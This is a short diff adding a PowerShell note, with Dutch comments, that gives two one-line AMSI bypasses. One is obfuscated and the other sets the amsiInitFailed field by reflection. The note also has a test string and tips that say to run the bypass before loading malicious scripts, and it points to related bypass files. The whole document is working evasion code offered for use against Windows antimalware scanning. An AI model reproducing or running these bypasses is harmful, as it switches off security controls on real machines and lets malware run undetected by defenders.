@@ -1,1 +1,11 @@
+# AMSI Bypass - ScanInterface patch (one-liner)
+# Zet AmsiScanBuffer scaninterface flag op true (bypass)
 ([ref].assembly.gettypes()|?{$_.name-match'siu'}).declaredfields[2].setvalue(0,$true)
+# Alternatief (minder geobfusceerd):
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+# Test of bypass werkt:
+'AmsiUtils'
+# Tip: Als "AmsiUtils" geen waarschuwing geeft, is de bypass actief
+# Tip: Draai VOOR het laden van kwaadaardige scripts
+# Tip: Werkt alleen in de huidige PowerShell sessie
+# Tip: Zie ook: amsi_bypass_reflection, amsi_bypass_patch, amsi_bypass_context
